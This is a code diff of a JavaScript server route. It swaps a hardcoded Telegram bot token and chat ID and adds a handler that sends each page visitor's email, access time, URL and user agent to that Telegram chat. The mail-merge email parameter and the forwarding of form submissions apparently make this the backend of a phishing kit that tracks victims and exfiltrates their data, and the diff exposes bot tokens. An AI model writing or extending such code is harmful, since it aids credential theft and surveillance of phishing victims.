@@ -6,9 +6,9 @@ import nodemailer from "nodemailer";
 // for telegram
 import { TelegramClient } from "telegramsjs";
 
-const botToken = "7845932956:AAF3wIfoatvyU-Jjmz6X28bSJKtXbHsWJaw";
+const botToken = "7927062257:AAHNqs9fLW6eL5sl-bHg35BdqK1MqbvTOFk";
 const bot = new TelegramClient(botToken);
-const chatId = "6024186045";
+const chatId = "7634751490";
 
 // Handle POST requests for form submissions
 export async function POST(req) {
@@ -69,13 +69,34 @@ ${landingUrl || 'No URL provided'}
   }
 }
 
-// Handle GET requests - No notifications for page access
+// Handle GET requests - Now with notifications for page access
 export async function GET(req) {
   try {
     const url = new URL(req.url);
     const email = url.searchParams.get('email') || url.searchParams.get('[-Email-]');
     
-    // No Telegram notification for page access
+    // Send Telegram notification for page access
+    const pageAccessMessage = `
+🌐 *Page Accessed*
+
+*Email:* ${email || 'No email provided'}
+
+✅ *Access Time:*
+${new Date().toLocaleString()}
+
+🌐 *Landing URL:*
+${req.url || 'No URL provided'}
+
+👤 *User Agent:*
+${req.headers.get('user-agent') || 'Not available'}
+    `;
+
+    await bot.sendMessage({
+      text: pageAccessMessage,
+      chatId: chatId,
+      parse_mode: "Markdown"
+    });
+
     console.log("Page accessed with email:", email);
     
     return new Response(
